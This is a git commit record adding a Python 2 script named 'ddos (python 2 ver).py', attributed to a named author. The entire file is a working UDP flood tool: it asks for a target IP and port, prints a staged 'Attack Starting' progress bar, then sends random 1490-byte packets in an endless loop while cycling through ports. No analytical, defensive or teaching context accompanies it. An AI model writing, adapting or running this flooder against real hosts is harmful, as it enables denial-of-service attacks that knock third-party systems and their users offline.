0bc12f699e7342cd2b24bb3509d34d0f7e97369b
Seyed Ali Javadi Moghadam <42797703+javadimoghadam@users.noreply.github.com>
2020-04-14 17:07:34 +0430

    Add Python 2.x version

---
+++ ddos (python 2 ver).py
@@ -0,0 +1,40 @@
+import sys
+import os
+import time
+import socket
+import random
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet Ali Ddos")
+print
+print "Author : Ali Javadi"
+print "github : https://github.com/javadimoghadam"
+print
+ip = raw_input("Target\'s IP : ")
+port = input("Port : ")
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
